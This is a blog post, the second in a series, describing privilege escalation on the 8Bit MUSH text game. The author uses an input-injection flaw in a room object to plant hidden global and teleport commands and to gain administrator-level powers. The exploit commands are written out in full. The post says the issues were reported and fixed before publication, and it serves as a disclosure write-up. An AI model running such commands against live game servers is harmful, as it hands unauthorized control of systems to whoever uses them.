---
id: 2570
title: 'Back-Alley Hacking: 8Bit MUSH (Part Two)'
date: '2021-02-20T15:58:07+00:00'
author: matt
guid: '/?p=2570'
permalink: /back-alley-hacking-8bit-mush-part-two/
categories:
    - MUSH
tags:
    - MUSH
---

In [Part One](/back-alley-hacking-8bit-mush-part-one/) we discovered an object that lets us execute arbitrary commands via unsafe handling of user input – the Alley room. Now we want to understand the blast radius of this issue. The first question to ask is, "What does the Alley control?"

```text
Alley(#9485RISVB)
Type: Room
Flags: TRUST STICKY VISUAL BATHROOM
Owner: 8BitMUSH  Zone: NOTHING  Coins: 0
Created: Sat Apr 28 13:14:31 2001
```
The help entry for `help control` tells us that if the Alley has the `TRUST` flag, it controls anything with the same owner that isn't set `WIZARD`. As it turns out, the `8BitMUSH` user owns a great deal of things throughout 8Bit.

<!--more-->

# Tedium

Two easy methods worked to start finding interesting objects:

- Running `@chan/who <channel>` on all the channels
- Trying to `examine` some low-DBREF numbers

For each item not `WIZARD` owned by `8BitMUSH` we can set it `VISUAL` and review the code. Here's one that has the `Search` and `See_All` powers that can be used for further exploring:

```text
The Global Command Object(#1984VfScSoToTaFa)
Type: Thing
Flags: VISUAL FUNCTIONS
Owner: 8BitMUSH  Zone: *NOTHING*  Coins: 1
Powers: Cemit Sql Pemit_All Search See_All
Location: Master Room
```
Let's attach a new global command to it that only we can use:

```text
> think set(#1984,C-+SNOWDAY:$+snowday *\:@swi/first \\\[strmatch(\\\%#\\,#30406)\\\]\\=0\\,\\{@pem/s \\\%#\\=Permission denied.\\}\\,\\{@force me=think pemit(\\\%#,\\\%0\\)})
> +snowday Hello \[name(\\%#)\]!
Hello TacoSal!
```
Modifying the Global Command Object takes a steady hand!

# The Big Hurt

Using our new command, we can see that objects owned by `8BitMUSH` that are not set `WIZARD` have the following powers:

```text
> +snowday \[pemit(\\%#,sort(unique(iter(lsearch(8BitMUSH,flag,!W),powers(\%i))),,,\%r))\]
```
- `Announce`
- `Cemit`
- `Holographic`
- `Long_Fingers`
- `No_Pay`
- `Pemit_All`
- `Queue`
- `Search`
- `See_All`
- `Sql`
- `Tport_Anything`
- `Tport_Anywhere`
- `Unkillable`

That puts all of these powers at our disposal. Obligatory visit to the Master Room:

```text
> think set(#5565,VISUAL)
> ex #5565
Strange Pipe(#5565IVe)
Type: Thing Flags: TRUST VISUAL ENTER_OK
Owner: 8BitMUSH  Zone: *NOTHING*  Coins: 1
Powers: Tport_Anything Tport_Anywhere
Location: Mario's Bathroom
> think set(#5565,CMD_WARP:$warp\:@swi/first \\\[strmatch(\\\%#\\,#30406%)\\\]\\=0\\,\\{@pem/s \\\%#\\=Permission denied.\\}\\,\\{@tel #30406=#2\\})
```
Now we just visit Mario's House at 30 Lakitu Blvd. and head upstairs:

```text
> look
Mario's Bathroom
A room-length counter, with an equally long mirror above it, lines one wall of this large bathroom. Across the room from it is a shower stall. Light blue tiling covers the walls and floor, although you are not sure if the color was intended that way or has just faded into its current hue. You also see a large shower stall, a white porcelain sink, a wall cabinet with a mirror on it, and a toilet.
Contents:
Strange Pipe
Obvious exits:
Out 
> warp
Master Room
This is the master room. Any exit in here is considered global. The same is true to objects with $-commands placed here. The number of objects and exits in this room should be kept to a minimum.
```
# Conclusion

In the span of a week we took a missing set of brackets and escalated into more powers than `ROYALTY` has. MUSH veterans probably have a better vision than I do for the potential outcomes. Chose your own adventure.

Hacking 8Bit is like beating your dad in basketball. It's a little sad when you win. The good news is that these issues have been turned over to staff and corrected prior to your reading this. Our security posture will be strong when the MUSH Wars renew and we feel the sting of battle once again.

What would you do as `WIZARD` for a day? I can say that seeing 8Bit from the top of Mount Slappy is better than anything you can see behind the curtain. My only regret before returning to a life of peasantry is not adding the `BATHROOM` flag to the Fountain. But as it turns out, this ability is jealously guarded, and no one but the wizards themselves may dictate who micturates in the fountains of ANSI City.

{: .notice--info}
**Update:** If you're looking for the secret conclusion to this series, you can find [Part Three](/back-alley-hacking-8bit-mush-part-three/) here.
